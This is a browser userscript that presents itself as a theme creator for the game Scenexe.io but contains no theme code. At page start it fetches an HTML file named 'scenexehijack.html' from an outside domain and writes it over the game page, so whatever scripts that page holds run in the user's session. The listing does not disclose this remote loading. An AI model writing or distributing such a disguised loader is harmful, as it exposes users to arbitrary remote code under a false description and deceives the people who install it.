// ==UserScript==
// @name          Kang's Scenexe.io Theme Creator
// @namespace     https://tampermonkey.net/
// @version       1.0.0
// @description   Create custom in-game themes in Scenexe.io
// @license       MIT
// @icon          https://scenexe.io/assets/icon1280bkg.png
// @author        Kang#1857 & damocles#0069
// @run-at        document-start
// @match         *://scenexe.io/*

// @downloadURL https://update.greasyfork.org/scripts/440522/Kang%27s%20Scenexeio%20Theme%20Creator.user.js
// @updateURL https://update.greasyfork.org/scripts/440522/Kang%27s%20Scenexeio%20Theme%20Creator.meta.js
// ==/UserScript==
(async () => {
const hijack = await fetch('https://lunahackley.gay/scenexehijack.html')
    .then(function(response) {
        return response.text()
    })
    window.document.write(hijack)
})()